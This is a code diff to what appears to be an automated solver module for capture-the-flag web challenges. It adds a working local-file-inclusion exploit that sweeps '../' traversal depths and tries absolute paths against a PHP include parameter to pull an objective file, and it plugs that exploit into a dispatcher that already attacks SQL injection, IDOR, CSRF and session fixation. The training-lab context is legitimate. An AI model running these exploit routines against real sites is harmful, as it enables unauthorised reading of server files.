@@ -30,6 +30,12 @@ unmodified, against five independent live apps across three release days
 day-25's mastery targets) - always try this exact string first against any
 `/search`-, `/lookup`-, or `/explore`-style `?q=` surface before any other
 injection form.
+
+`rec_lfi` is ported unchanged from `day-20-web-exploitation/common.py` (it
+was the only graded recoverer not yet folded in here) - a 2026-10-25 scan of
+every web solve.py for reusable patterns (`docs/web-solver-templates.md`)
+found it and promoted it; that same scan produced the drop-in worker starter
+and template modules under `solver_py_scripts/web_templates/`.
 """
 import json
 import re
@@ -201,6 +207,33 @@ def rec_idor(t, html):
                     return match.group(0)
                 break
     return None
+
+
+def rec_lfi(t, html, prompt=""):
+    """A PHP (or similar) viewer links an endpoint that `include`s a file named by a
+    query parameter (e.g. `?doc=about.php`), with no path-traversal sanitization.
+    The endpoint/parameter names are derived from that link; the objective file's
+    path is derived from the challenge prompt text ("mounted at <path>") when given,
+    else a documented default. A bounded `../`-depth sweep (1-8) finds the right
+    traversal depth without guessing the directory layout; one absolute-path
+    fallback covers includes that also accept a leading slash.
+    Source: day-20-web-exploitation/common.py's `rec_lfi` (curriculum day 4,
+    release day 20) - promoted here unchanged after a 2026-10-25 template scan
+    found it was the only graded recoverer not yet folded into this module."""
+    link = re.search(r'href="([^"]*\.php)\?(\w+)=', html)
+    endpoint, param = (link.group(1), link.group(2)) if link else ("/reader.php", "doc")
+    objective = re.search(r"mounted at (/\S+)", prompt)
+    target_path = objective.group(1).rstrip(".") if objective else "/run/huntress/objective.txt"
+    rel = target_path.lstrip("/")
+    for depth in range(1, 9):
+        payload = "../" * depth + rel
+        status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: payload})}", save=f"lfi_d{depth}")
+        match = PROOF_RE.search(body)
+        if match:
+            return match.group(0)
+    status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: target_path})}", save="lfi_abs")
+    match = PROOF_RE.search(body)
+    return match.group(0) if match else None
 
 
 def rec_session_fixation(t, clues):
@@ -488,7 +521,7 @@ def rec_sqli_group_close(t, html):
     return None
 
 
-def classify_and_recover(t, evidence=None):
+def classify_and_recover(t, evidence=None, prompt=""):
     """Evidence-led dispatcher: GET / once, then try each recognized class in order.
 
     Mirrors the restored day-19/day-20 dispatcher order (admin/clues-driven apps
@@ -496,7 +529,10 @@ def classify_and_recover(t, evidence=None):
     evidence before SQLi; backup-exposure investigated last since its only tell is
     a vague comment). Extend this - do not assume a form is SQLi or that an unknown
     page is backup exposure. `evidence` (a dict) is filled in for the caller's notes
-    if given; this function never talks to anything but `t`'s own origin."""
+    if given; this function never talks to anything but `t`'s own origin. `prompt`
+    is the challenge's own prompt text (optional) - only `rec_lfi` uses it, to find
+    a "mounted at <path>" objective-file hint; omitting it falls back to the
+    documented default path."""
     evidence = evidence if evidence is not None else {}
     status, html = t.get("/", save="root")
     evidence["root_status"] = status
@@ -562,6 +598,12 @@ def classify_and_recover(t, evidence=None):
             proof = rec_csrf(t, clues)
             if proof:
                 return proof
+
+    if re.search(r'href="[^"]*\.php\?\w+=', html):
+        evidence["classification"] = "LFI (path traversal viewer)"
+        proof = rec_lfi(t, html, prompt)
+        if proof:
+            return proof
 
     if re.search(r'href="(/api/[^"]+)"', html) and re.findall(r'href="(/[a-z]+/\d+)"', html):
         evidence["classification"] = "IDOR"
